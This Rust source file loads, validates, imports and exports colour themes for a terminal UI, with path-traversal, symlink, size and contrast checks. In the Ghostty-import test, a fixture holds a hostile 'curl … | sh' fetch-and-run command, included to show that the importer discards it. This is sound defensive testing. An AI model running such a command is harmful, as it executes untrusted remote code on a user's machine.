use std::fmt;
use std::path::Path;

use ratatui::style::Color;

use super::manifest::{ThemeAppearance, ThemeComponents, ThemeManifestV1};
use crate::app::state::Palette;

const MAX_THEME_BYTES: u64 = 64 * 1024;

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct LoadedTheme {
    pub name: String,
    pub appearance: ThemeAppearance,
    pub palette: Palette,
    pub components: ThemeComponents,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct ImportedGhosttyTheme {
    pub theme: LoadedTheme,
    pub ignored_keys: Vec<String>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub(crate) struct DiscoveredThemes {
    pub themes: Vec<(String, LoadedTheme)>,
    pub diagnostics: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct ThemeLoadError {
    source: String,
    message: String,
}

impl ThemeLoadError {
    fn new(source: impl Into<String>, message: impl Into<String>) -> Self {
        Self {
            source: source.into(),
            message: message.into(),
        }
    }
}

impl fmt::Display for ThemeLoadError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(formatter, "{}: {}", self.source, self.message)
    }
}

impl std::error::Error for ThemeLoadError {}

pub(crate) fn load_manifest_str(
    source: &str,
    source_name: &str,
) -> Result<LoadedTheme, ThemeLoadError> {
    if source.len() as u64 > MAX_THEME_BYTES {
        return Err(ThemeLoadError::new(
            source_name,
            format!("theme exceeds the {MAX_THEME_BYTES}-byte limit"),
        ));
    }
    let manifest: ThemeManifestV1 = toml::from_str(source)
        .map_err(|error| ThemeLoadError::new(source_name, format!("invalid manifest: {error}")))?;
    validate_manifest(&manifest, source_name)?;

    let resolve = |value: &str| resolve_color(value, &manifest.palette, source_name);
    let semantic = &manifest.semantic;
    let canvas = resolve(&semantic.canvas)?;
    let panel = resolve(&semantic.panel)?;
    let text = resolve(&semantic.text)?;
    let text_muted = resolve(&semantic.text_muted)?;
    let text_bright = semantic
        .text_bright
        .as_deref()
        .map(resolve)
        .transpose()?
        .unwrap_or(text_muted);
    let focus = resolve(&semantic.focus)?;
    let attention = resolve(&semantic.attention)?;
    let working = resolve(&semantic.working)?;
    let proof_fresh = resolve(&semantic.proof_fresh)?;
    let proof_stale = resolve(&semantic.proof_stale)?;
    let border = semantic
        .border
        .as_deref()
        .map(resolve)
        .transpose()?
        .unwrap_or(panel);
    let danger = semantic
        .danger
        .as_deref()
        .map(resolve)
        .transpose()?
        .unwrap_or(attention);
    let canvas_dim = semantic
        .canvas_dim
        .as_deref()
        .map(resolve)
        .transpose()?
        .unwrap_or(canvas);
    let text_faint = semantic
        .text_faint
        .as_deref()
        .map(resolve)
        .transpose()?
        .unwrap_or(text_muted);
    let special = semantic
        .special
        .as_deref()
        .map(resolve)
        .transpose()?
        .unwrap_or(focus);
    let done = semantic
        .done
        .as_deref()
        .map(resolve)
        .transpose()?
        .unwrap_or(proof_fresh);
    let caution = semantic
        .caution
        .as_deref()
        .map(resolve)
        .transpose()?
        .unwrap_or(proof_stale);

    validate_contrast("text", text, canvas, 7.0, source_name)?;
    validate_contrast("text_muted", text_muted, canvas, 4.5, source_name)?;
    validate_contrast("selected text", text, panel, 4.5, source_name)?;
    for (label, color) in [
        ("attention", attention),
        ("working", working),
        ("proof_fresh", proof_fresh),
        ("proof_stale", proof_stale),
    ] {
        validate_contrast(label, color, canvas, 3.0, source_name)?;
    }

    Ok(LoadedTheme {
        name: manifest.meta.name,
        appearance: manifest.meta.appearance,
        components: manifest.components.into(),
        palette: Palette {
            accent: focus,
            panel_bg: canvas,
            surface0: panel,
            surface1: border,
            surface_dim: canvas_dim,
            overlay0: text_faint,
            overlay1: text_bright,
            text,
            subtext0: text_muted,
            mauve: special,
            green: done,
            yellow: caution,
            red: danger,
            blue: working,
            teal: proof_fresh,
            peach: proof_stale,
        },
    })
}

pub(crate) fn load_named_from(
    name: &str,
    themes_directory: &Path,
) -> Result<LoadedTheme, ThemeLoadError> {
    if !is_safe_theme_name(name) {
        return Err(ThemeLoadError::new(
            name,
            "expected a safe theme name containing only letters, numbers, '-' or '_'",
        ));
    }
    let path = themes_directory.join(format!("{name}.toml"));
    let metadata = std::fs::symlink_metadata(&path).map_err(|error| {
        ThemeLoadError::new(
            path.display().to_string(),
            format!("cannot read theme: {error}"),
        )
    })?;
    if metadata.file_type().is_symlink() || !metadata.is_file() {
        return Err(ThemeLoadError::new(
            path.display().to_string(),
            "theme must be a regular file, not a symlink",
        ));
    }
    if metadata.len() > MAX_THEME_BYTES {
        return Err(ThemeLoadError::new(
            path.display().to_string(),
            format!("theme exceeds the {MAX_THEME_BYTES}-byte limit"),
        ));
    }
    let source = std::fs::read_to_string(&path).map_err(|error| {
        ThemeLoadError::new(
            path.display().to_string(),
            format!("cannot read theme: {error}"),
        )
    })?;
    load_manifest_str(&source, &path.display().to_string())
}

pub(crate) fn load_named(name: &str) -> Result<LoadedTheme, ThemeLoadError> {
    let themes_directory = crate::config::config_path()
        .parent()
        .unwrap_or_else(|| Path::new("."))
        .join("themes");
    load_named_from(name, &themes_directory)
}

pub(crate) fn discover_from(themes_directory: &Path) -> DiscoveredThemes {
    let entries = match std::fs::read_dir(themes_directory) {
        Ok(entries) => entries,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
            return DiscoveredThemes::default();
        }
        Err(error) => {
            return DiscoveredThemes {
                themes: Vec::new(),
                diagnostics: vec![format!(
                    "cannot scan theme directory {}: {error}",
                    themes_directory.display()
                )],
            };
        }
    };
    let mut candidates = entries
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .filter(|path| path.extension().and_then(|extension| extension.to_str()) == Some("toml"))
        .collect::<Vec<_>>();
    candidates.sort();
    let mut discovered = DiscoveredThemes::default();
    if candidates.len() > 128 {
        discovered.diagnostics.push(format!(
            "theme directory {} contains {} TOML files; only the first 128 were inspected",
            themes_directory.display(),
            candidates.len()
        ));
        candidates.truncate(128);
    }
    for path in candidates {
        let Some(name) = path.file_stem().and_then(|name| name.to_str()) else {
            discovered
                .diagnostics
                .push(format!("theme filename {} is not UTF-8", path.display()));
            continue;
        };
        if !is_safe_theme_name(name) {
            discovered.diagnostics.push(format!(
                "theme filename {} is not a safe named theme",
                path.display()
            ));
            continue;
        }
        match load_named_from(name, themes_directory) {
            Ok(theme) if normalize_theme_name(&theme.name) == normalize_theme_name(name) => {
                discovered.themes.push((normalize_theme_name(name), theme));
            }
            Ok(theme) => discovered.diagnostics.push(format!(
                "theme file {} declares meta.name '{}'; expected '{}'",
                path.display(),
                theme.name,
                name
            )),
            Err(error) => discovered.diagnostics.push(error.to_string()),
        }
    }
    discovered
}

pub(crate) fn discover() -> DiscoveredThemes {
    let themes_directory = crate::config::config_path()
        .parent()
        .unwrap_or_else(|| Path::new("."))
        .join("themes");
    discover_from(&themes_directory)
}

pub(crate) fn config_diagnostics(config: &crate::config::Config) -> Vec<String> {
    let manual = config.theme.name.as_deref().unwrap_or("nagi-night");
    let mut names = vec![(manual, None)];
    if config.theme.auto_switch {
        if let Some(name) = config.theme.dark_name.as_deref() {
            names.push((name, Some(ThemeAppearance::Dark)));
        }
        if let Some(name) = config.theme.light_name.as_deref() {
            names.push((name, Some(ThemeAppearance::Light)));
        }
    }
    let mut diagnostics = Vec::new();
    for (name, expected_appearance) in names {
        if Palette::from_name(name).is_some() {
            continue;
        }
        match load_named(name) {
            Ok(theme) if normalize_theme_name(&theme.name) != normalize_theme_name(name) => {
                diagnostics.push(format!(
                    "theme file '{name}' declares meta.name '{}'; expected the configured name",
                    theme.name
                ));
            }
            Ok(theme)
                if expected_appearance.is_some_and(|expected| expected != theme.appearance) =>
            {
                diagnostics.push(format!(
                    "theme '{name}' has {:?} appearance but its configured light/dark role disagrees",
                    theme.appearance
                ));
            }
            Ok(_) => {}
            Err(error) => diagnostics.push(error.to_string()),
        }
    }
    diagnostics.extend(discover().diagnostics);
    diagnostics.sort();
    diagnostics.dedup();
    diagnostics
}

/// Import only Ghostty color options. Every other configuration key is reported
/// and ignored, so a theme can never smuggle executable terminal settings into
/// Nagi.
pub(crate) fn import_ghostty_color_source(
    source: &str,
    name: &str,
) -> Result<ImportedGhosttyTheme, ThemeLoadError> {
    if source.len() as u64 > MAX_THEME_BYTES {
        return Err(ThemeLoadError::new(
            name,
            format!("Ghostty theme exceeds the {MAX_THEME_BYTES}-byte limit"),
        ));
    }
    let mut background = None;
    let mut foreground = None;
    let mut selection_background = None;
    let mut palette = std::collections::BTreeMap::<u8, Color>::new();
    let mut ignored_keys = Vec::new();
    for (line_index, raw_line) in source.lines().enumerate() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let Some((raw_key, raw_value)) = line.split_once('=') else {
            return Err(ThemeLoadError::new(
                name,
                format!("invalid Ghostty theme line {}", line_index + 1),
            ));
        };
        let key = raw_key.trim();
        let value = raw_value.trim();
        match key {
            "background" => background = Some(parse_ghostty_color(value, name, key)?),
            "foreground" => foreground = Some(parse_ghostty_color(value, name, key)?),
            "selection-background" => {
                selection_background = Some(parse_ghostty_color(value, name, key)?)
            }
            "palette" => {
                let Some((index, color)) = value.split_once('=') else {
                    return Err(ThemeLoadError::new(
                        name,
                        format!("invalid Ghostty palette at line {}", line_index + 1),
                    ));
                };
                let index = index.trim().parse::<u8>().map_err(|_| {
                    ThemeLoadError::new(name, format!("invalid Ghostty palette index '{index}'"))
                })?;
                if index <= 15 {
                    palette.insert(index, parse_ghostty_color(color.trim(), name, "palette")?);
                }
            }
            _ => {
                if !ignored_keys.iter().any(|ignored| ignored == key) {
                    ignored_keys.push(key.to_string());
                }
            }
        }
    }
    let background = background
        .ok_or_else(|| ThemeLoadError::new(name, "Ghostty theme is missing background"))?;
    let foreground = foreground
        .ok_or_else(|| ThemeLoadError::new(name, "Ghostty theme is missing foreground"))?;
    validate_contrast("text", foreground, background, 7.0, name)?;
    let candidate_muted = palette.get(&8).copied().unwrap_or(foreground);
    let text_muted = if contrast_ratio(candidate_muted, background).unwrap_or(0.0) >= 4.5 {
        candidate_muted
    } else {
        foreground
    };
    let panel = selection_background.unwrap_or(background);
    validate_contrast("selected text", foreground, panel, 4.5, name)?;
    let focus = palette.get(&4).copied().unwrap_or(foreground);
    let attention = palette.get(&1).copied().unwrap_or(foreground);
    let done = palette.get(&2).copied().unwrap_or(foreground);
    let caution = palette.get(&3).copied().unwrap_or(foreground);
    let working = palette.get(&12).copied().unwrap_or(focus);
    let proof_fresh = palette.get(&6).copied().unwrap_or(done);
    let proof_stale = palette.get(&11).copied().unwrap_or(caution);
    let special = palette.get(&5).copied().unwrap_or(focus);
    let appearance = if contrast_ratio(Color::Rgb(255, 255, 255), background)
        .is_some_and(|ratio| ratio >= 4.5)
    {
        ThemeAppearance::Dark
    } else {
        ThemeAppearance::Light
    };

    Ok(ImportedGhosttyTheme {
        theme: LoadedTheme {
            name: name.to_string(),
            appearance,
            components: ThemeComponents::default(),
            palette: Palette {
                accent: focus,
                panel_bg: background,
                surface0: panel,
                surface1: text_muted,
                surface_dim: background,
                overlay0: text_muted,
                overlay1: text_muted,
                text: foreground,
                subtext0: text_muted,
                mauve: special,
                green: done,
                yellow: caution,
                red: attention,
                blue: working,
                teal: proof_fresh,
                peach: proof_stale,
            },
        },
        ignored_keys,
    })
}

pub(crate) fn export_manifest(theme: &LoadedTheme) -> Result<String, ThemeLoadError> {
    let palette = &theme.palette;
    let color = |label: &str, value: Color| {
        color_hex(value).ok_or_else(|| {
            ThemeLoadError::new(&theme.name, format!("cannot export non-RGB {label} color"))
        })
    };
    let appearance = match theme.appearance {
        ThemeAppearance::Dark => "dark",
        ThemeAppearance::Light => "light",
    };
    let quoted_name = toml::Value::String(theme.name.clone()).to_string();
    Ok(format!(
        r#"[meta]
name = {quoted_name}
schema = 1
appearance = "{appearance}"

[palette]
canvas = "{}"
panel = "{}"
canvas_dim = "{}"
border = "{}"
text = "{}"
muted = "{}"
bright = "{}"
faint = "{}"
focus = "{}"
attention = "{}"
working = "{}"
fresh = "{}"
stale = "{}"
special = "{}"
done = "{}"
caution = "{}"

[semantic]
canvas = "canvas"
panel = "panel"
canvas_dim = "canvas_dim"
border = "border"
text = "text"
text_muted = "muted"
text_bright = "bright"
text_faint = "faint"
focus = "focus"
attention = "attention"
danger = "attention"
working = "working"
proof_fresh = "fresh"
proof_stale = "stale"
special = "special"
done = "done"
caution = "caution"

[components]
border = "{}"
selection = "{}"
density = "{}"
motion = "{}"
"#,
        color("canvas", palette.panel_bg)?,
        color("panel", palette.surface0)?,
        color("canvas_dim", palette.surface_dim)?,
        color("border", palette.surface1)?,
        color("text", palette.text)?,
        color("muted", palette.subtext0)?,
        color("bright", palette.overlay1)?,
        color("faint", palette.overlay0)?,
        color("focus", palette.accent)?,
        color("attention", palette.red)?,
        color("working", palette.blue)?,
        color("fresh", palette.teal)?,
        color("stale", palette.peach)?,
        color("special", palette.mauve)?,
        color("done", palette.green)?,
        color("caution", palette.yellow)?,
        theme.components.border.as_str(),
        theme.components.selection.as_str(),
        theme.components.density.as_str(),
        theme.components.motion.as_str(),
    ))
}

fn parse_ghostty_color(value: &str, source_name: &str, key: &str) -> Result<Color, ThemeLoadError> {
    let normalized = if value.starts_with('#') {
        value.to_string()
    } else if value.len() == 6 && value.bytes().all(|byte| byte.is_ascii_hexdigit()) {
        format!("#{value}")
    } else {
        value.to_string()
    };
    match parse_literal_color(&normalized) {
        Some(color @ Color::Rgb(..)) => Ok(color),
        _ => Err(ThemeLoadError::new(
            source_name,
            format!("Ghostty {key} color '{value}' must resolve to direct RGB"),
        )),
    }
}

fn color_hex(color: Color) -> Option<String> {
    let Color::Rgb(red, green, blue) = color else {
        return None;
    };
    Some(format!("#{red:02x}{green:02x}{blue:02x}"))
}

fn validate_manifest(manifest: &ThemeManifestV1, source_name: &str) -> Result<(), ThemeLoadError> {
    if manifest.meta.schema != 1 {
        return Err(ThemeLoadError::new(
            source_name,
            format!(
                "unsupported theme schema {}; expected 1",
                manifest.meta.schema
            ),
        ));
    }
    let name = manifest.meta.name.trim();
    if name.is_empty() || name.chars().count() > 64 || name.chars().any(char::is_control) {
        return Err(ThemeLoadError::new(
            source_name,
            "theme meta.name must contain 1 to 64 printable characters",
        ));
    }
    Ok(())
}

fn resolve_color(
    value: &str,
    palette: &std::collections::BTreeMap<String, String>,
    source_name: &str,
) -> Result<Color, ThemeLoadError> {
    resolve_color_inner(value, palette, source_name, &mut Vec::new())
}

fn resolve_color_inner(
    value: &str,
    palette: &std::collections::BTreeMap<String, String>,
    source_name: &str,
    stack: &mut Vec<String>,
) -> Result<Color, ThemeLoadError> {
    let value = value.trim();
    if let Some(next) = palette.get(value) {
        if stack.iter().any(|entry| entry == value) {
            return Err(ThemeLoadError::new(
                source_name,
                format!("cyclic palette reference '{value}'"),
            ));
        }
        stack.push(value.to_string());
        let result = resolve_color_inner(next, palette, source_name, stack);
        stack.pop();
        return result;
    }
    parse_literal_color(value).ok_or_else(|| {
        ThemeLoadError::new(
            source_name,
            format!("unknown color or palette reference '{value}'"),
        )
    })
}

fn parse_literal_color(value: &str) -> Option<Color> {
    let value = value.trim().to_ascii_lowercase();
    if let Some(hex) = value.strip_prefix('#') {
        return match hex.len() {
            6 => Some(Color::Rgb(
                u8::from_str_radix(&hex[0..2], 16).ok()?,
                u8::from_str_radix(&hex[2..4], 16).ok()?,
                u8::from_str_radix(&hex[4..6], 16).ok()?,
            )),
            3 => {
                let mut channels = hex.chars().map(|character| {
                    u8::from_str_radix(&character.to_string(), 16)
                        .ok()
                        .map(|channel| channel * 17)
                });
                Some(Color::Rgb(
                    channels.next()??,
                    channels.next()??,
                    channels.next()??,
                ))
            }
            _ => None,
        };
    }
    if let Some(inner) = value
        .strip_prefix("rgb(")
        .and_then(|value| value.strip_suffix(')'))
    {
        let channels = inner
            .split(',')
            .map(|channel| channel.trim().parse::<u8>())
            .collect::<Result<Vec<_>, _>>()
            .ok()?;
        return (channels.len() == 3).then(|| Color::Rgb(channels[0], channels[1], channels[2]));
    }
    match value.as_str() {
        "black" => Some(Color::Black),
        "red" => Some(Color::Red),
        "green" => Some(Color::Green),
        "yellow" => Some(Color::Yellow),
        "blue" => Some(Color::Blue),
        "magenta" | "purple" => Some(Color::Magenta),
        "cyan" => Some(Color::Cyan),
        "white" => Some(Color::White),
        "gray" | "grey" => Some(Color::Gray),
        "darkgray" | "darkgrey" => Some(Color::DarkGray),
        "lightred" => Some(Color::LightRed),
        "lightgreen" => Some(Color::LightGreen),
        "lightyellow" => Some(Color::LightYellow),
        "lightblue" => Some(Color::LightBlue),
        "lightmagenta" => Some(Color::LightMagenta),
        "lightcyan" => Some(Color::LightCyan),
        _ => None,
    }
}

fn validate_contrast(
    label: &str,
    foreground: Color,
    background: Color,
    minimum: f64,
    source_name: &str,
) -> Result<(), ThemeLoadError> {
    let ratio = contrast_ratio(foreground, background).ok_or_else(|| {
        ThemeLoadError::new(
            source_name,
            format!("{label} contrast cannot be validated for terminal-index colors"),
        )
    })?;
    if ratio < minimum {
        return Err(ThemeLoadError::new(
            source_name,
            format!("{label} contrast is {ratio:.2}:1; expected at least {minimum:.1}:1"),
        ));
    }
    Ok(())
}

fn contrast_ratio(foreground: Color, background: Color) -> Option<f64> {
    let Color::Rgb(fr, fg, fb) = foreground else {
        return None;
    };
    let Color::Rgb(br, bg, bb) = background else {
        return None;
    };
    let foreground = luminance(fr, fg, fb);
    let background = luminance(br, bg, bb);
    let lighter = foreground.max(background);
    let darker = foreground.min(background);
    Some((lighter + 0.05) / (darker + 0.05))
}

fn luminance(red: u8, green: u8, blue: u8) -> f64 {
    let linear = |channel: u8| {
        let value = f64::from(channel) / 255.0;
        if value <= 0.04045 {
            value / 12.92
        } else {
            ((value + 0.055) / 1.055).powf(2.4)
        }
    };
    0.2126 * linear(red) + 0.7152 * linear(green) + 0.0722 * linear(blue)
}

pub(crate) fn is_safe_theme_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 64
        && name
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_'))
}

fn normalize_theme_name(name: &str) -> String {
    name.to_lowercase().replace([' ', '_'], "-")
}

#[cfg(test)]
mod tests {
    use ratatui::style::Color;

    use super::*;

    const VALID_THEME: &str = r##"
[meta]
name = "forest calm"
schema = 1
appearance = "dark"

[palette]
canvas = "#101820"
panel = "#182430"
paper = "#f5f0e8"
muted = "#aeb8c2"
indigo = "#7ca8d8"
red = "#ef7166"
blue = "#73a4d6"
mint = "#78ccb9"
amber = "#d9ad63"

[semantic]
canvas = "canvas"
panel = "panel"
text = "paper"
text_muted = "muted"
focus = "indigo"
attention = "red"
working = "blue"
proof_fresh = "mint"
proof_stale = "amber"
"##;

    #[test]
    fn custom_theme_manifest_resolves_named_semantic_colors() {
        let loaded = load_manifest_str(VALID_THEME, "fixture.toml").unwrap();

        assert_eq!(loaded.name, "forest calm");
        assert_eq!(loaded.palette.panel_bg, Color::Rgb(16, 24, 32));
        assert_eq!(loaded.palette.surface0, Color::Rgb(24, 36, 48));
        assert_eq!(loaded.palette.text, Color::Rgb(245, 240, 232));
        assert_eq!(loaded.palette.accent, Color::Rgb(124, 168, 216));
        assert_eq!(loaded.palette.teal, Color::Rgb(120, 204, 185));
    }

    #[test]
    fn custom_theme_preserves_typed_component_preferences() {
        use crate::theme::manifest::{
            ThemeBorderStyle, ThemeDensity, ThemeMotion, ThemeSelectionStyle,
        };

        let source = format!(
            "{VALID_THEME}\n[components]\nborder = \"plain\"\nselection = \"fill\"\ndensity = \"compact\"\nmotion = \"none\"\n"
        );
        let loaded = load_manifest_str(&source, "components.toml").unwrap();

        assert_eq!(loaded.components.border, ThemeBorderStyle::Plain);
        assert_eq!(loaded.components.selection, ThemeSelectionStyle::Fill);
        assert_eq!(loaded.components.density, ThemeDensity::Compact);
        assert_eq!(loaded.components.motion, ThemeMotion::None);
    }

    #[test]
    fn low_contrast_theme_is_rejected_with_a_specific_diagnostic() {
        let source = VALID_THEME.replace("#f5f0e8", "#182431");

        let error = load_manifest_str(&source, "low-contrast.toml").unwrap_err();

        assert!(error.to_string().contains("text contrast"));
    }

    #[test]
    fn named_theme_loader_rejects_path_traversal() {
        let directory = tempfile::tempdir().unwrap();

        let error = load_named_from("../secret", directory.path()).unwrap_err();

        assert!(error.to_string().contains("safe theme name"));
    }

    #[test]
    fn bundled_nagi_manifests_match_the_public_palettes() {
        for (name, expected) in [
            ("nagi-night", crate::app::state::Palette::nagi_night()),
            ("nagi-dawn", crate::app::state::Palette::nagi_dawn()),
        ] {
            let source = crate::theme::builtins::source(name).expect("bundled theme source");
            let loaded = load_manifest_str(source, name).unwrap();
            assert_eq!(loaded.palette, expected);
        }
    }

    #[test]
    fn ghostty_import_reads_only_colors_and_ignores_executable_settings() {
        let source = r#"
background = #101820
foreground = #f5f0e8
selection-background = #243342
palette = 1=#ef7166
palette = 2=#78ccb9
palette = 3=#d9ad63
palette = 4=#7ca8d8
palette = 6=#78ccb9
palette = 8=#aeb8c2
palette = 11=#d9ad63
palette = 12=#73a4d6
command = curl https://example.invalid/payload | sh
font-family = untrusted
"#;

        let imported = import_ghostty_color_source(source, "safe import").unwrap();

        assert_eq!(imported.theme.palette.panel_bg, Color::Rgb(16, 24, 32));
        assert_eq!(imported.theme.palette.accent, Color::Rgb(124, 168, 216));
        assert_eq!(imported.ignored_keys, vec!["command", "font-family"]);
        assert_eq!(imported.theme.appearance, ThemeAppearance::Dark);
    }

    #[test]
    fn imported_ghostty_theme_round_trips_as_a_safe_nagi_manifest() {
        let imported = import_ghostty_color_source(
            "background = #101820\nforeground = #f5f0e8\npalette = 4=#7ca8d8\n",
            "round trip",
        )
        .unwrap();

        let exported = export_manifest(&imported.theme).unwrap();
        let reloaded = load_manifest_str(&exported, "round-trip.toml").unwrap();

        assert_eq!(reloaded, imported.theme);
        assert!(!exported.contains("command"));
    }

    #[test]
    fn discovery_keeps_valid_themes_and_reports_invalid_neighbors() {
        let directory = tempfile::tempdir().unwrap();
        std::fs::write(directory.path().join("forest-calm.toml"), VALID_THEME).unwrap();
        std::fs::write(
            directory.path().join("broken.toml"),
            "[meta]\nschema = 99\n",
        )
        .unwrap();

        let discovered = discover_from(directory.path());

        assert_eq!(discovered.themes.len(), 1);
        assert_eq!(discovered.themes[0].0, "forest-calm");
        assert_eq!(discovered.diagnostics.len(), 1);
        assert!(discovered.diagnostics[0].contains("broken.toml"));
    }
}
